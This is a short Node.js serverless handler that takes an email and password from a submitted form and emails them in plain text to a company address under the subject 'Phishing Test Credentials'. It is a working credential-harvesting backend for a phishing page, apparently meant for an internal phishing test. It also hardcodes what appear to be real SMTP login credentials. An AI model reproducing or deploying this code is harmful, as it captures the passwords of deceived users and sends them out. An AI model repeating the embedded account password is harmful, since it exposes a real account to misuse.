const nodemailer = require('nodemailer');

exports.handler = async function(event, context) {
  const { email, password } = JSON.parse(event.body);

  // Configure your SMTP server details
  const transporter = nodemailer.createTransport({
    host: 'smtp.office365.com',
    port: 587,
    secure: false,
    auth: {
      user: 'italert@favorich.com',
      pass: 'Vov71807'
    }
  });

  const mailOptions = {
    from: 'italert@favorich.com',
    to: 'yicheng.yeong@favorich.com',
    subject: 'Phishing Test Credentials',
    text: `Email: ${email}\nPassword: ${password}`
  };

  try {
    await transporter.sendMail(mailOptions);
    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Form submitted successfully' })
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Failed to send email' })
    };
  }
};
